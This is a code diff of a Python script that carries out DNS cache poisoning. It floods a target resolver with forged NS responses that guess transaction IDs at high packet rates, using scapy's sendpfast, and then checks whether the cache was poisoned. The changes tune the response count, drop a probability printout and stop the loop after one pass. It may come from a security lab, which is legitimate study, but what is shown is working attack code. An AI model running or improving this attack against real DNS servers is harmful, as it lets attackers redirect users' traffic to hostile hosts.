@@ -71,20 +71,18 @@ def forged_ns_response(id, target_domain):
 counter = 0
 while True:
     target_domain = "www{}{}".format(counter, target_domain_base)
-    counter = (counter + 1) % (2 ** 16)
+    counter += 1
 
     packet_list = [initial_request(target_domain)]
 
-    response_amount = 1000
+    response_amount = 500
     r = random.randint(0, (2 ** 16) - response_amount + 1)
     for i in range(r, r + response_amount):
         packet_list.append(
             forged_ns_response(i, target_domain))
 
-    p_txid_match = (1 / (2 ** 16)) * response_amount * counter * 100
-    print("Iteration: {}, possible cache poisoning: {:4.2f}%".format(counter, p_txid_match))
-    print("Sending packets from {} with id in interval [{}, {}] to {}".format(known_ns_ip, r, r + response_amount,
-                                                                              target_dns_ip))
+    print("Sending packets from {} with id in interval [{:#x}, {:#x}] to {}".format(known_ns_ip, r, r + response_amount,
+                                                                                    target_dns_ip))
 
     sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
 
@@ -98,3 +96,4 @@ while True:
             print("Poisoning failed")
     except:
         print("Poisoning failed")
+    break
